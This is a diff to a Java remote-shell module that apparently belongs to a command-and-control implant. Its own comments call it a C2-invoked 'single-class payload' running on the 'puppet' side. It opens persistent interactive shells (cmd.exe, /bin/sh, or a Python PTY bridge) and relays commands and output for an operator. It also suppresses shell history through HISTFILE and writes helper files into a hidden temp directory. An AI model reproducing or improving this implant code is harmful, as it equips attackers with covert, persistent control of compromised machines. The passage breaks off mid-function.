@@ -1,157 +1,182 @@
 package org.leo.core.component;
 
-import java.io.*;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.UnsupportedEncodingException;
+import java.io.Writer;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 
 /**
- * 命令执行组件
- * <p>
- * 在 puppet 端创建交互式 shell（cmd.exe / /bin/sh -i），
- * 通过 write/read/stop 操作实现持久化命令执行。
- * <p>
- * 操作类型（op）：
- * - 首次调用（processMap 不存在）：启动 shell 进程
- * - 0：写入命令（WRITE）
- * - 1：读取输出（READ），附带 alive/exitCode 状态
- * - 2：停止进程（STOP）
- * <p>
- * v3.0 修复：
- * 1. 进程创建竞态 — 启动线程前先占位 processMap，run() 内填充字段
- * 2. OOM 防护 — 输出缓冲区超过 10MB 自动截断
- * 3. 进程状态感知 — read 返回 alive/exitCode
- * 4. params 竞态 — run() 启动前用局部变量捕获 processId
- * 5. 僵尸条目清理 — run() 退出后标记 exited
- * 6. Windows 编码 — 动态检测而非硬编码 GBK
- * 7. 资源泄漏 — destroy 时显式关闭 stdin
- * 8. Windows 输入 — xterm 发送的 \r 转为 \r\n 以适配 cmd.exe 管道模式
- * 9. Windows 回显 — 管道模式无实时回显，手动将输入写入输出缓冲区
- * <p>
- * 遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/匿名内部类/diamond。
+ * Persistent interactive terminal component.
  *
- * @author LeoSpring
- * @version 3.0
+ * Unix uses one full PTY backend (Python) and one dependency-free pipe shell.
+ * Windows uses the same pipe contract through cmd.exe. Keeping one primary
+ * path and one basic fallback makes startup behavior predictable.
+ *
+ * Java 6 single-class payload: no lambdas, inner classes or Java 7+ APIs.
  */
 public class ExecCommandComponent implements Runnable {
 
     private static final int OP_WRITE = 0;
     private static final int OP_READ = 1;
     private static final int OP_STOP = 2;
-
-    private static final String WINDOWS_CMD = "cmd.exe";
-
-    /**
-     * Unix PTY shell 启动脚本（运行时检测）：
-     * 1. python3 pty.spawn — 完整 PTY
-     * 2. python pty.spawn — 兼容旧系统
-     * 3. script -qc — Linux 伪终端包装
-     * 4. /bin/sh -i — 最终回退（无 PTY，但可交互）
-     */
-    private static final String UNIX_PTY_SCRIPT =
-        "if command -v python3 >/dev/null 2>&1; then " +
-            "exec python3 -c \"import pty; pty.spawn(['/bin/sh'])\"; " +
-        "elif command -v python >/dev/null 2>&1; then " +
-            "exec python -c \"import pty; pty.spawn(['/bin/sh'])\"; " +
-        "elif command -v script >/dev/null 2>&1; then " +
-            "exec script -qc /bin/sh /dev/null; " +
-        "else " +
-            "exec /bin/sh -i; " +
-        "fi";
+    private static final int OP_RESIZE = 3;
 
     private static final int BUFFER_SIZE = 1024;
-    private static final int MAX_OUTPUT_BYTES = 10 * 1024 * 1024; // 10MB 输出上限
+    private static final int MAX_OUTPUT_BYTES = 10 * 1024 * 1024;
     private static final int MAX_PROCESS_COUNT = 32;
     private static final long IDLE_TIMEOUT_MS = 30L * 60L * 1000L;
+    private static final long START_TIMEOUT_MS = 2500L;
+    private static final long STOP_WAIT_MS = 750L;
+    private static final long BACKEND_PROBE_MS = 300L;
 
-    private static final String KEY_LAST_ACCESS_TIME = "lastAccessTime";
     private static final String KEY_CREATED_AT = "createdAt";
+    private static final String KEY_LAST_ACCESS_TIME = "lastAccessTime";
+    private static final String KEY_BACKEND = "backend";
+    private static final String KEY_PTY = "pty";
+    private static final String KEY_RESIZABLE = "resizable";
+    private static final String KEY_BACKEND_FAILURES = "backendFailures";
+    private static final String KEY_INSTANCE_ID = "instanceId";
 
-    // processId -> processMap（线程安全）
-    private static Map env = new ConcurrentHashMap();
-
-    // 【修复 #4】run() 启动前捕获的 processId，避免 params 被后续调用覆盖
+    private static final Map env = new ConcurrentHashMap();
     private static final Map THREAD_PARAMS = new ConcurrentHashMap();
+    private static final String INSTANCE_ID = createInstanceId();
+
+    private static final String PYTHON_PTY_BRIDGE =
+        "from __future__ import print_function\n" +
+        "import errno,fcntl,os,pty,select,signal,struct,sys,termios,time\n" +
+        "shell_path,size_path=sys.argv[1:3]\n" +
+        "environment=os.environ.copy()\n" +
+        "environment['TERM']=environment.get('TERM') or 'xterm-256color'\n" +
+        "environment['COLORTERM']=environment.get('COLORTERM') or 'truecolor'\n" +
+        "environment['HISTFILE']=os.devnull\n" +
+        "pid,master=pty.fork()\n" +
+        "if pid==0: os.execve(shell_path,[shell_path,'-i'],environment)\n" +
+        "flags=fcntl.fcntl(master,fcntl.F_GETFL)\n" +
+        "fcntl.fcntl(master,fcntl.F_SETFL,flags|os.O_NONBLOCK)\n" +
+        "running=[True]\n" +
+        "def stop(sig,frame):\n" +
+        " running[0]=False\n" +
+        " try: os.kill(pid,sig)\n" +
+        " except OSError: pass\n" +
+        "for sig in (signal.SIGTERM,signal.SIGHUP,signal.SIGINT): signal.signal(sig,stop)\n" +
+        "last_size=[None]\n" +
+        "def copy(source,target):\n" +
+        " try: data=os.read(source,65536)\n" +
+        " except OSError as error:\n" +
+        "  if error.errno in (errno.EAGAIN,errno.EINTR): return True\n" +
+        "  if source==master and error.errno==errno.EIO: return False\n" +
+        "  raise\n" +
+        " if not data: return False\n" +
+        " while data:\n" +
+        "  try:\n" +
+        "   written=os.write(target,data)\n" +
+        "   if written<=0: return False\n" +
+        "   data=data[written:]\n" +
+        "  except OSError as error:\n" +
+        "   if error.errno in (errno.EAGAIN,errno.EINTR): time.sleep(0.01)\n" +
+        "   else: raise\n" +
+        " return True\n" +
+        "def resize():\n" +
+        " try:\n" +
+        "  stream=open(size_path,'rb'); raw=stream.read(64); stream.close()\n" +
+        "  if raw==last_size[0]: return\n" +
+        "  last_size[0]=raw\n" +
+        "  if not isinstance(raw,str): raw=raw.decode('ascii','ignore')\n" +
+        "  cols,rows=[int(value) for value in raw.strip().split(',')]\n" +
+        "  cols=max(20,min(500,cols)); rows=max(5,min(200,rows))\n" +
+        "  fcntl.ioctl(master,termios.TIOCSWINSZ,struct.pack('HHHH',rows,cols,0,0))\n" +
+        "  try: os.kill(pid,signal.SIGWINCH)\n" +
+        "  except OSError: pass\n" +
+        " except (IOError,OSError,ValueError): pass\n" +
+        "try:\n" +
+        " while running[0]:\n" +
+        "  resize()\n" +
+        "  ready=select.select([master,0],[],[],0.20)[0]\n" +
+        "  if master in ready and not copy(master,1): break\n" +
+        "  if 0 in ready and not copy(0,master): break\n" +
+        "  if os.waitpid(pid,os.WNOHANG)[0]==pid: pid=0; break\n" +
+        "finally:\n" +
+        " if pid>0:\n" +
+        "  try: os.kill(pid,signal.SIGTERM)\n" +
+        "  except OSError: pass\n" +
+        "  try: os.waitpid(pid,0)\n" +
+        "  except OSError: pass\n" +
+        " try: os.close(master)\n" +
+        " except OSError: pass\n";
 
     private HashMap params;
     private HashMap results;
 
-    public void invoke() throws Exception {
-        execCommand();
+    public void run() {
+        String workerProcessId = (String) THREAD_PARAMS.remove(Thread.currentThread());
+        if (workerProcessId != null) {
+            runProcess(workerProcessId);
+            return;
+        }
+
+        java.lang.reflect.InvocationHandler handler =
+                (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
+        try {
+            params = (HashMap) handler.invoke(null, null, null);
+            results = new HashMap();
+            execCommand();
+        } catch (Throwable error) {
+            if (results == null) results = new HashMap();
+            results.put("code", Integer.valueOf(500));
+            results.put("msg", error.getMessage() != null ? error.getMessage() : error.getClass().getName());
+        }
+        try {
+            handler.invoke(null, null, new Object[]{results});
+        } catch (Throwable ignored) {
+        }
     }
 
-    public void run() {
-        // Component 入口：当前线程不在 THREAD_PARAMS 中，说明是 C2 调用而非后台读取线程
-        if (!THREAD_PARAMS.containsKey(Thread.currentThread())) {
-            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
-            try {
-                params = (java.util.HashMap) h.invoke(null, null, null);
-                results = new java.util.HashMap();
-                invoke();
-            } catch (Throwable t) {
-                if (results == null) results = new java.util.HashMap();
-                results.put("code", Integer.valueOf(500));
-                results.put("msg", t.getMessage());
-            }
-            if (results != null) {
-                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
-            }
-            return;
-        }
-        // 后台读取线程路径
-        // 【修复 #4】从 THREAD_PARAMS 获取 processId，而非从可能已被覆盖的 params 中读
-        String processId = (String) THREAD_PARAMS.remove(Thread.currentThread());
-        if (processId == null) {
-            return;
-        }
-
+    private void runProcess(String processId) {
         Map processMap = (Map) env.get(processId);
-        if (processMap == null) {
-            return; // 不应发生，占位 map 应已存在
-        }
+        if (processMap == null) return;
 
-        ProcessBuilder builder = createProcessBuilder();
-        builder.redirectErrorStream(true);
-        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
         Process process = null;
         InputStream stdout = null;
         InputStreamReader reader = null;
         try {
-            process = builder.start();
-
-            // 填充占位 map 的实际字段
+            process = startCompatibleProcess(processId, processMap);
+            ByteArrayOutputStream output = new ByteArrayOutputStream();
             processMap.put("stdin", process.getOutputStream());
-            processMap.put("output", outputStream);
+            processMap.put("output", output);
             processMap.put("process", process);
+            notifyStateChange(processMap);
 
-            // 【修复 #6】动态检测 Windows 控制台编码
-            String charset = detectCharset();
-
-            stdout = process.getInputStream();
-            reader = new InputStreamReader(stdout, charset);
-
-            char[] buffer = new char[BUFFER_SIZE];
-            int len;
-
-            while ((len = reader.read(buffer)) != -1) {
-                byte[] utf8Bytes = new String(buffer, 0, len).getBytes("UTF-8");
-                // 【修复 #2】输出超过上限时不再追加，防止 OOM
-                synchronized (outputStream) {
-                    if (outputStream.size() < MAX_OUTPUT_BYTES) {
-                        int remaining = MAX_OUTPUT_BYTES - outputStream.size();
-                        if (utf8Bytes.length <= remaining) {
-                            outputStream.write(utf8Bytes);
-                        } else {
-                            outputStream.write(utf8Bytes, 0, remaining);
-                        }
-                    }
-                }
+            if (Boolean.TRUE.equals(processMap.get("stopped"))) {
+                process.destroy();
+                return;
             }
 
-        } catch (IOException e) {
-            // 进程被 destroy 或 I/O 中断，正常退出
-            processMap.put("error", e.getMessage() != null ? e.getMessage() : e.getClass().getName());
+            stdout = process.getInputStream();
+            reader = new InputStreamReader(stdout, detectCharset());
+            char[] buffer = new char[BUFFER_SIZE];
+            int length;
+            while ((length = reader.read(buffer)) != -1) {
+                byte[] utf8 = new String(buffer, 0, length).getBytes("UTF-8");
+                synchronized (output) {
+                    int remaining = MAX_OUTPUT_BYTES - output.size();
+                    if (remaining > 0) {
+                        output.write(utf8, 0, Math.min(remaining, utf8.length));
+                    }
+                    if (utf8.length > remaining) processMap.put("outputTruncated", Boolean.TRUE);
+                }
+            }
+        } catch (Throwable error) {
+            processMap.put("error", error.getMessage() != null ? error.getMessage() : error.getClass().getName());
             if (process != null) {
                 try { process.destroy(); } catch (Exception ignored) {}
             }
@@ -161,84 +186,201 @@ public class ExecCommandComponent implements Runnable {
             } else if (stdout != null) {
                 try { stdout.close(); } catch (IOException ignored) {}
             }
-            // 【修复 #5】进程自然退出后标记，供 read 感知
-            if (processMap != null) {
-                processMap.put("exited", Boolean.TRUE);
-            }
+            processMap.put("exited", Boolean.TRUE);
+            notifyStateChange(processMap);
         }
     }
 
     private void execCommand() throws Exception {
         String processId = getStringParam("processId");
-        if (processId == null || processId.trim().length() == 0) {
-            throw new IllegalArgumentException("processId is required");
+        if (processId == null || processId.trim().length() == 0 || processId.length() > 128) {
+            throw new IllegalArgumentException("invalid processId");
         }
-        Object operationObj = params.get("op");
-        if (!(operationObj instanceof Number)) {
-            throw new IllegalArgumentException("op must be a number");
-        }
-        int operation = ((Number) operationObj).intValue();
-
+        Object operationValue = params.get("op");
+        if (!(operationValue instanceof Number)) throw new IllegalArgumentException("op must be a number");
+        int operation = ((Number) operationValue).intValue();
         cleanupExpiredProcesses();
 
         Map processMap = (Map) env.get(processId);
-
         if (processMap == null) {
             if (operation != OP_WRITE) {
                 writeMissingProcessResult(operation);
                 return;
             }
-            if (env.size() >= MAX_PROCESS_COUNT) {
-                throw new IllegalStateException("too many active terminal processes, max=" + MAX_PROCESS_COUNT);
-            }
-
-            // 【修复 #1】先占位 processMap，再启动线程，避免竞态重复创建
-            ConcurrentHashMap placeholder = new ConcurrentHashMap();
-            long now = System.currentTimeMillis();
-            placeholder.put(KEY_CREATED_AT, Long.valueOf(now));
-            placeholder.put(KEY_LAST_ACCESS_TIME, Long.valueOf(now));
-            Object existing = ((ConcurrentHashMap) env).putIfAbsent(processId, placeholder);
-            if (existing != null) {
-                processMap = (Map) existing;
-            } else {
-                // 【修复 #4】通过 THREAD_PARAMS 传递 processId，避免 params 竞态
-                Thread t = new Thread(this, "ExecCommand-" + processId);
-                t.setDaemon(true);
-                THREAD_PARAMS.put(t, processId);
-                try {
-                    t.start();
-                } catch (RuntimeException e) {
-                    THREAD_PARAMS.remove(t);
-                    if (env.get(processId) == placeholder) env.remove(processId);
-                    throw e;
-                }
-
-                results.put("code", 200);
-                results.put("msg", "process starting");
-                return;
-            }
+            processMap = startProcess(processId);
         }
 
         touchProcess(processMap);
-
-        switch (operation) {
-            case OP_WRITE:
-                writeCommand(processMap);
-                break;
-            case OP_READ:
-                readOutput(processMap);
-                break;
-            case OP_STOP:
-                destroyProcess(processId, processMap);
-                break;
-            default:
-                throw new IllegalArgumentException("Invalid op: " + operation);
+        if (operation == OP_WRITE) {
+            waitForProcessReady(processMap);
+            String command = getStringParam("cmd");
+            if (!"init".equals(command)) writeCommand(processMap);
+            writeTerminalMetadata(processMap);
+            results.put("initialized", Boolean.TRUE);
+            results.put("alive", Boolean.TRUE);
+        } else if (operation == OP_READ) {
+            readOutput(processMap);
+        } else if (operation == OP_RESIZE) {
+            resizeTerminal(processMap);
+        } else if (operation == OP_STOP) {
+            destroyProcess(processId, processMap);
+            results.put("alive", Boolean.FALSE);
+            results.put("stopped", Boolean.TRUE);
+        } else {
+            throw new IllegalArgumentException("Invalid op: " + operation);
         }
+        results.put("code", Integer.valueOf(200));
+    }
 
-        results.put("code", 200);
+    private Map startProcess(String processId) {
+        ConcurrentHashMap placeholder = new ConcurrentHashMap();
+        long now = System.currentTimeMillis();
+        placeholder.put(KEY_CREATED_AT, Long.valueOf(now));
+        placeholder.put(KEY_LAST_ACCESS_TIME, Long.valueOf(now));
+        Map existing;
+        synchronized (env) {
+            existing = (Map) env.get(processId);
+            if (existing == null) {
+                if (env.size() >= MAX_PROCESS_COUNT) {
+                    throw new IllegalStateException("too many active terminal processes, max=" + MAX_PROCESS_COUNT);
+                }
+                ((ConcurrentHashMap) env).put(processId, placeholder);
+            }
+        }
+        if (existing != null) return existing;
+
+        Thread worker = new Thread(this, "ExecCommand-" + processId);
+        worker.setDaemon(true);
+        THREAD_PARAMS.put(worker, processId);
+        try {
+            worker.start();
+        } catch (RuntimeException error) {
+            THREAD_PARAMS.remove(worker);
+            ((ConcurrentHashMap) env).remove(processId, placeholder);
+            throw error;
+        }
+        return placeholder;
+    }
+
+    private void waitForProcessReady(Map processMap) throws Exception {
+        long deadline = System.currentTimeMillis() + START_TIMEOUT_MS;
+        synchronized (processMap) {
+            while (processMap.get("stdin") == null && processMap.get("error") == null
+                    && !Boolean.TRUE.equals(processMap.get("exited"))) {
+                long remaining = deadline - System.currentTimeMillis();
+                if (remaining <= 0) break;
+                processMap.wait(remaining);
+            }
+        }
+        if (processMap.get("stdin") == null) {
+            Object error = processMap.get("error");
+            throw new IllegalStateException(error != null ? String.valueOf(error) : "terminal startup timed out");
+        }
+    }
+
+    private void notifyStateChange(Map processMap) {
+        synchronized (processMap) {
+            processMap.notifyAll();
+        }
+    }
+
+    private void writeCommand(Map processMap) throws IOException {
+        byte[] command = getBytesParam("cmd");
+        OutputStream writer = (OutputStream) processMap.get("stdin");
+        if (writer == null) throw new IllegalStateException("terminal stdin is not ready");
+        if (isWindows()) {
+            command = convertCrForWindows(command);
+            echoForWindows(processMap, command);
+        }
+        synchronized (writer) {
+            writer.write(command);
+            writer.flush();
+        }
+    }
+
+    private void readOutput(Map processMap) throws IOException {
+        ByteArrayOutputStream output = (ByteArrayOutputStream) processMap.get("output");
+        byte[] data = new byte[0];
+        if (output != null) {
+            synchronized (output) {
+                data = output.toByteArray();
+                output.reset();
+            }
+        }
+        if (Boolean.TRUE.equals(processMap.remove("outputTruncated"))) {
+            byte[] marker = "\r\n[terminal output truncated]\r\n".getBytes("UTF-8");
+            ByteArrayOutputStream combined = new ByteArrayOutputStream(data.length + marker.length);
+            combined.write(data);
+            combined.write(marker);
+            data = combined.toByteArray();
+        }
+        results.put("data", data);
+
+        Process process = (Process) processMap.get("process");
+        if (process == null) {
+            results.put("alive", Boolean.valueOf(!Boolean.TRUE.equals(processMap.get("exited"))));
+            results.put("starting", Boolean.TRUE);
+        } else {
+            try {
+                results.put("exitCode", Integer.valueOf(process.exitValue()));
+                results.put("alive", Boolean.FALSE);
+            } catch (IllegalThreadStateException running) {
+                results.put("alive", Boolean.TRUE);
+            }
+        }
+        Object error = processMap.get("error");
+        if (error != null) results.put("error", error);
+        writeTerminalMetadata(processMap);
+    }
+
+    private void resizeTerminal(Map processMap) throws IOException {
+        int[] size = parseTerminalSize(getStringParam("cmd"));
+        boolean resized = false;
+        File sizeFile = (File) processMap.get("sizeFile");
+        if (Boolean.TRUE.equals(processMap.get(KEY_RESIZABLE)) && sizeFile != null) {
+            writeTextFile(sizeFile, size[0] + "," + size[1]);
+            resized = true;
+        }
+        processMap.put("cols", Integer.valueOf(size[0]));
+        processMap.put("rows", Integer.valueOf(size[1]));
+        results.put("cols", Integer.valueOf(size[0]));
+        results.put("rows", Integer.valueOf(size[1]));
+        results.put("resized", Boolean.valueOf(resized));
+        writeTerminalMetadata(processMap);
+    }
+
+    private int[] parseTerminalSize(String value) {
+        if (value == null) throw new IllegalArgumentException("resize expects cols,rows");
+        int separator = value.indexOf(',');
+        if (separator <= 0 || separator != value.lastIndexOf(',')) {
+            throw new IllegalArgumentException("resize expects cols,rows");
+        }
+        try {
+            int cols = Integer.parseInt(value.substring(0, separator).trim());
+            int rows = Integer.parseInt(value.substring(separator + 1).trim());
+            cols = Math.max(20, Math.min(500, cols));
+            rows = Math.max(5, Math.min(200, rows));
+            return new int[]{cols, rows};
+        } catch (NumberFormatException error) {
+            throw new IllegalArgumentException("resize expects cols,rows");
+        }
+    }
+
+    private void writeTerminalMetadata(Map processMap) {
+        results.put(KEY_BACKEND, valueOrDefault(processMap.get(KEY_BACKEND), "starting"));
+        results.put(KEY_PTY, Boolean.valueOf(Boolean.TRUE.equals(processMap.get(KEY_PTY))));
+        results.put(KEY_RESIZABLE, Boolean.valueOf(Boolean.TRUE.equals(processMap.get(KEY_RESIZABLE))));
+        results.put(KEY_INSTANCE_ID, INSTANCE_ID);
+        Object backendFailures = processMap.get(KEY_BACKEND_FAILURES);
+        if (backendFailures != null) results.put(KEY_BACKEND_FAILURES, backendFailures);
+    }
+
+    private Object valueOrDefault(Object value, Object fallback) {
+        return value != null ? value : fallback;
     }
 
     private void writeMissingProcessResult(int operation) {
+        results.put(KEY_INSTANCE_ID, INSTANCE_ID);
         if (operation == OP_READ) {
             results.put("data", new byte[0]);
             results.put("alive", Boolean.FALSE);
@@ -247,237 +389,330 @@ public class ExecCommandComponent implements Runnable {
             return;
         }
         if (operation == OP_STOP) {
-            results.put("msg", "process not found");
+            results.put("alive", Boolean.FALSE);
             results.put("missing", Boolean.TRUE);
             results.put("code", Integer.valueOf(200));
             return;
         }
+        if (operation == OP_RESIZE) throw new IllegalStateException("terminal session is not initialized");
         throw new IllegalArgumentException("Invalid op: " + operation);
     }
 
     private void touchProcess(Map processMap) {
-        if (processMap != null) {
-            processMap.put(KEY_LAST_ACCESS_TIME, Long.valueOf(System.currentTimeMillis()));
-        }
+        processMap.put(KEY_LAST_ACCESS_TIME, Long.valueOf(System.currentTimeMillis()));
     }
 
     private void cleanupExpiredProcesses() {
         long now = System.currentTimeMillis();
-        Iterator it = env.entrySet().iterator();
-        while (it.hasNext()) {
-            Map.Entry entry = (Map.Entry) it.next();
-            String processId = (String) entry.getKey();
+        Iterator iterator = env.entrySet().iterator();
+        while (iterator.hasNext()) {
+            Map.Entry entry = (Map.Entry) iterator.next();
             Map processMap = (Map) entry.getValue();
             Long lastAccess = (Long) processMap.get(KEY_LAST_ACCESS_TIME);
-            if (lastAccess == null) {
-                processMap.put(KEY_LAST_ACCESS_TIME, Long.valueOf(now));
-                continue;
-            }
-            if (now - lastAccess.longValue() > IDLE_TIMEOUT_MS) {
-                destroyProcess(processId, processMap);
+            if (lastAccess != null && now - lastAccess.longValue() > IDLE_TIMEOUT_MS) {
+                destroyProcess((String) entry.getKey(), processMap);
             }
         }
     }
 
-    private void writeCommand(Map processMap) throws IOException {
-        byte[] command = (byte[]) params.get("cmd");
-
-        OutputStream writer = (OutputStream) processMap.get("stdin");
-        if (writer == null) {
-            // 进程可能还在启动中，stdin 尚未就绪
-            throw new IllegalStateException("stdin not ready, process may still be starting");
+    private void destroyProcess(String processId, Map processMap) {
+        processMap.put("stopped", Boolean.TRUE);
+        OutputStream stdin = (OutputStream) processMap.get("stdin");
+        if (stdin != null) {
+            try { stdin.close(); } catch (Exception ignored) {}
         }
+        Process process = (Process) processMap.get("process");
+        if (process != null) {
+            try { process.destroy(); } catch (Exception ignored) {}
+            long deadline = System.currentTimeMillis() + STOP_WAIT_MS;
+            while (isProcessAlive(process) && System.currentTimeMillis() < deadline) {
+                try { Thread.sleep(25L); } catch (InterruptedException interrupted) {
+                    Thread.currentThread().interrupt();
+                    break;
+                }
+            }
+            if (isProcessAlive(process)) {
+                try { process.destroy(); } catch (Exception ignored) {}
+            }
+        }
+        ((ConcurrentHashMap) env).remove(processId, processMap);
+        deleteTerminalFiles(processMap);
+        notifyStateChange(processMap);
+    }
 
-        // 【修复 #8】Windows cmd.exe 通过管道读取时需要 \r\n 作为行结束符，
-        // 但 xterm.js 按 Enter 只发送 \r，导致 cmd.exe 不识别输入。
-        // 将孤立的 \r（不跟随 \n）转换为 \r\n。
-        // 【修复 #9】Windows 管道模式无实时回显，手动将输入写入输出缓冲区。
+    private boolean isProcessAlive(Process process) {
+        if (process == null) return false;
+        try {
+            process.exitValue();
+            return false;
+        } catch (IllegalThreadStateException running) {
+            return true;
+        }
+    }
+
+    private Process startCompatibleProcess(String processId, Map processMap) throws Exception {
+        int attempt;
+        int attempts = isWindows() ? 1 : 2;
+        for (attempt = 0; attempt < attempts; attempt++) {
+            ProcessBuilder builder = createProcessBuilder(processId, processMap, attempt);
+            if (builder == null) continue;
+            builder.redirectErrorStream(true);
+            Process candidate = null;
+            try {
+                candidate = builder.start();
+                if (waitForBackendReady(candidate)) return candidate;
+                recordBackendFailure(processMap, String.valueOf(processMap.get(KEY_BACKEND)),
+                        readProcessMessage(candidate));
+            } catch (Throwable error) {
+                recordBackendFailure(processMap, String.valueOf(processMap.get(KEY_BACKEND)),
+                        error.getMessage() != null ? error.getMessage() : error.getClass().getName());
+            } finally {
+                if (candidate != null && !isProcessAlive(candidate)) closeProcessStreams(candidate);
+            }
+            if (candidate != null && isProcessAlive(candidate)) {
+                try { candidate.destroy(); } catch (Exception ignored) {}
+                closeProcessStreams(candidate);
+            }
+            resetBackendFiles(processMap);
+        }
+        throw new IOException("no compatible terminal backend: "
+                + valueOrDefault(processMap.get(KEY_BACKEND_FAILURES), "no candidates"));
+    }
+
+    private boolean waitForBackendReady(Process process) {
+        long deadline = System.currentTimeMillis() + BACKEND_PROBE_MS;
+        while (System.currentTimeMillis() < deadline) {
+            if (!isProcessAlive(process)) return false;
+            try {
+                Thread.sleep(25L);
+            } catch (InterruptedException interrupted) {
+                Thread.currentThread().interrupt();
+                return false;
+            }
+        }
+        return isProcessAlive(process);
+    }
+
+    private String readProcessMessage(Process process) {
+        InputStream input = null;
+        try {
+            input = process.getInputStream();
+            ByteArrayOutputStream output = new ByteArrayOutputStream();
+            byte[] buffer = new byte[256];
+            while (input.available() > 0 && output.size() < 1024) {
+                int length = input.read(buffer, 0, Math.min(buffer.length, 1024 - output.size()));
+                if (length <= 0) break;
+                output.write(buffer, 0, length);
+            }
+            String message = new String(output.toByteArray(), detectCharset()).trim();
+            return message.length() > 160 ? message.substring(0, 160) : message;
+        } catch (Exception ignored) {
+            return "process exited during startup";
+        }
+    }
+
+    private void recordBackendFailure(Map processMap, String backend, String message) {
+        String previous = (String) processMap.get(KEY_BACKEND_FAILURES);
+        String current = backend + (message == null || message.length() == 0 ? "" : ": " + message);
+        processMap.put(KEY_BACKEND_FAILURES, previous == null ? current : previous + "; " + current);
+    }
+
+    private void closeProcessStreams(Process process) {
+        try { process.getInputStream().close(); } catch (Exception ignored) {}
+        try { process.getErrorStream().close(); } catch (Exception ignored) {}
+        try { process.getOutputStream().close(); } catch (Exception ignored) {}
+    }
+
+    private void resetBackendFiles(Map processMap) {
+        deleteTerminalFiles(processMap);
+        processMap.remove("helperFile");
+        processMap.remove("sizeFile");
+    }
+
+    private ProcessBuilder createProcessBuilder(String processId, Map processMap, int attempt) throws IOException {
         if (isWindows()) {
-            command = convertCrForWindows(command);
-            echoForWindows(processMap, command);
+            if (attempt != 0) return null;
+            setBackend(processMap, "windows-pipe", false, false);
+            return new ProcessBuilder(new String[]{"cmd.exe", "/Q"});
         }
 
-        writer.write(command);
-        writer.flush();
+        String shell = selectShell();
+        if (attempt == 0) {
+            String python = findExecutable("python3");
+            if (python == null) python = findExecutable("python");
+            if (python == null) return null;
+            File directory = terminalDirectory();
+            String key = Integer.toHexString(processId.hashCode()) + "-"
+                    + Integer.toHexString(System.identityHashCode(processMap));
+            File helper = new File(directory, key + ".py");
+            File size = new File(directory, key + ".size");
+            writeTextFile(helper, PYTHON_PTY_BRIDGE);
+            writeTextFile(size, "80,24");
+            processMap.put("helperFile", helper);
+            processMap.put("sizeFile", size);
+            processMap.put("cols", Integer.valueOf(80));
+            processMap.put("rows", Integer.valueOf(24));
+            setBackend(processMap, new File(python).getName() + "-pty", true, true);
+            return new ProcessBuilder(new String[]{python, helper.getAbsolutePath(), shell, size.getAbsolutePath()});
+        }
+
+        if (attempt != 1) return null;
+        setBackend(processMap, "unix-pipe", false, false);
+        return new ProcessBuilder(new String[]{shell, "-i"});
     }
 
-    /**
-     * 【修复 #9】Windows 管道模式下 cmd.exe 不会实时回显输入字符，
-     * 手动将输入内容写入输出缓冲区，让前端能即时看到键入内容。
-     * 控制字符（除 \r\n 外）不做回显，避免乱码。
-     */
+    private void setBackend(Map processMap, String backend, boolean pty, boolean resizable) {
+        processMap.put(KEY_BACKEND, backend);
+        processMap.put(KEY_PTY, Boolean.valueOf(pty));
+        processMap.put(KEY_RESIZABLE, Boolean.valueOf(resizable));
+    }
+
+    private File terminalDirectory() throws IOException {
+        File directory = new File(System.getProperty("java.io.tmpdir"), ".leo-java-terminal");
+        if (!directory.isDirectory() && !directory.mkdirs() && !directory.isDirectory()) {
+            throw new IOException("failed to create terminal directory");
+        }
+        directory.setReadable(false, false);
+        directory.setWritable(false, false);
+        directory.setExecutable(false, false);
+        directory.setReadable(true, true);
+        directory.setWritable(true, true);
+        directory.setExecutable(true, true);
+        return directory;
+    }
+
+    private void writeTextFile(File file, String value) throws IOException {
+        Writer writer = null;
+        try {
+            writer = new OutputStreamWriter(new FileOutputStream(file, false), "UTF-8");
+            writer.write(value);
+            writer.flush();
+        } finally {
+            if (writer != null) try { writer.close(); } catch (IOException ignored) {}
+        }
+        file.setReadable(true, true);
+        file.setWritable(true, true);
+    }
+
+    private void deleteTerminalFiles(Map processMap) {
+        File helper = (File) processMap.get("helperFile");
+        File size = (File) processMap.get("sizeFile");
+        if (helper != null) try { helper.delete(); } catch (Exception ignored) {}
+        if (size != null) try { size.delete(); } catch (Exception ignored) {}
+    }
+
+    private String findExecutable(String name) {
+        String path = System.getenv("PATH");
+        if (path != null) {
+            String[] directories = path.split(File.pathSeparator);
+            int index;
+            for (index = 0; index < directories.length; index++) {
+                File candidate = new File(directories[index], name);
+                if (candidate.isFile() && candidate.canExecute()) return candidate.getAbsolutePath();
+            }
+        }
+        String[] defaults = new String[]{"/usr/bin/", "/bin/", "/usr/local/bin/", "/opt/homebrew/bin/"};
+        int index;
+        for (index = 0; index < defaults.length; index++) {
+            File candidate = new File(defaults[index] + name);
+            if (candidate.isFile() && candidate.canExecute()) return candidate.getAbsolutePath();
+        }
+        return null;
+    }
+
+    private String selectShell() {
+        String[] candidates = new String[]{"/bin/sh", "/bin/bash", "/bin/zsh", "/bin/ksh"};
+        int index;
+        for (index = 0; index < candidates.length; index++) {
+            File file = new File(candidates[index]);
+            if (file.isFile() && file.canExecute()) return file.getAbsolutePath();
+        }
+        String configured = System.getenv("SHELL");
+        if (configured != null) {
+            File file = new File(configured);
+            if (file.isFile() && file.canExecute()) return file.getAbsolutePath();
+        }
+        return "/bin/sh";
+    }
+
     private void echoForWindows(Map processMap, byte[] command) {
-        ByteArrayOutputStream outputStream = (ByteArrayOutputStream) processMap.get("output");
-        if (outputStream == null) {
-            return;
-        }
-        synchronized (outputStream) {
-            for (int i = 0; i < command.length; i++) {
-                byte b = command[i];
-                if (b == '\r') {
-                    // \r\n 回显为换行
-                    if (i + 1 < command.length && command[i + 1] == '\n') {
-                        outputStream.write('\r');
-                        outputStream.write('\n');
-                        i++; // 跳过 \n
-                    } else {
-                        outputStream.write('\r');
-                        outputStream.write('\n');
-                    }
-                } else if (b == '\n') {
-                    outputStream.write('\r');
-                    outputStream.write('\n');
-                } else if (b == '\b' || b == 127) {
